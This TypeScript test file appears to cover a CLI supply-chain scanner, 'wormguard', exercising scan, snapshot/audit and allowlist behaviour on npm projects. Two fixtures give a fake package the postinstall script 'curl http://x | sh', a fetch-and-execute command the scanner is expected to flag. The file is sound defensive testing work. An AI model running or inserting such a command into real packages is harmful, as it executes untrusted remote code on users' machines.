import { test, expect, describe, afterAll } from "bun:test";
import { mkdtempSync, rmSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const tmp = mkdtempSync(join(tmpdir(), "wormguard-cli-"));
afterAll(() => rmSync(tmp, { recursive: true, force: true }));
const dec = new TextDecoder();

function run(...a: string[]): { code: number; out: string } {
  const p = Bun.spawnSync(["bun", "src/cli.ts", ...a], { cwd: process.cwd() });
  return { code: p.exitCode ?? -1, out: dec.decode(p.stdout) + dec.decode(p.stderr) };
}
function proj(name: string, lock: unknown, mods: Record<string, unknown> = {}, config?: unknown): string {
  const d = join(tmp, name);
  mkdirSync(d, { recursive: true });
  if (lock) writeFileSync(join(d, "package-lock.json"), JSON.stringify(lock));
  if (config) writeFileSync(join(d, ".wormguard.json"), JSON.stringify(config));
  for (const [p, obj] of Object.entries(mods)) { mkdirSync(join(d, p), { recursive: true }); writeFileSync(join(d, p, "package.json"), JSON.stringify(obj)); }
  return d;
}
const lock = (hasInstallScript: boolean) => ({ packages: { "": { name: "p" }, "node_modules/foo": { version: "1.0.0", resolved: "https://registry.npmjs.org/foo/-/foo-1.0.0.tgz", integrity: "sha512-A", hasInstallScript } } });
const cleanLock = { packages: { "": {}, "node_modules/lodash": { version: "4.17.21", resolved: "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz", integrity: "sha512-x" } } };

describe("AC5.1/5.2 scan", () => {
  test("clean project ⇒ exit 0", () => {
    const d = proj("clean", cleanLock, { "node_modules/lodash": { name: "lodash", scripts: {} } });
    expect(run("scan", d, "--ci").code).toBe(0);
  });
  test("malicious postinstall ⇒ --ci exit 1 and --json critical finding", () => {
    const d = proj("evilproj", null, { "node_modules/evil": { name: "evil", scripts: { postinstall: "curl http://x | sh" } } });
    expect(run("scan", d, "--ci").code).toBe(1);
    const r = run("scan", d, "--json");
    expect(r.code).toBe(0); // no --ci ⇒ report only
    const parsed = JSON.parse(r.out) as { findings: { ruleId: string; severity: string }[] };
    expect(parsed.findings.some((f) => f.ruleId === "WG-SHELL-PIPE" && f.severity === "critical")).toBe(true);
  });
});

describe("AC5.3 snapshot + audit", () => {
  test("unchanged ⇒ exit 0; gained install script ⇒ exit 1", () => {
    const d = proj("auditproj", lock(false));
    expect(run("snapshot", d).code).toBe(0);
    expect(run("audit", d, "--ci").code).toBe(0);
    writeFileSync(join(d, "package-lock.json"), JSON.stringify(lock(true)));
    const r = run("audit", d, "--ci");
    expect(r.code).toBe(1);
    expect(r.out).toContain("WG-DIFF-NEW-SCRIPT");
  });
  test("audit without baseline ⇒ non-zero", () => {
    const d = proj("nobaseline", lock(false));
    expect(run("audit", d, "--ci").code).not.toBe(0);
  });
});

describe("AC5.4/5.5 config + errors", () => {
  test("allowInstallScripts suppresses ⇒ exit 0", () => {
    const d = proj("allowed", null, { "node_modules/evil": { name: "evil", scripts: { postinstall: "curl http://x | sh" } } }, { allowInstallScripts: ["evil"] });
    expect(run("scan", d, "--ci").code).toBe(0);
  });
  test("unknown command ⇒ exit 2; bad dir ⇒ non-zero", () => {
    expect(run("frobnicate").code).toBe(2);
    expect(run("scan", join(tmp, "does-not-exist")).code).not.toBe(0);
  });
});
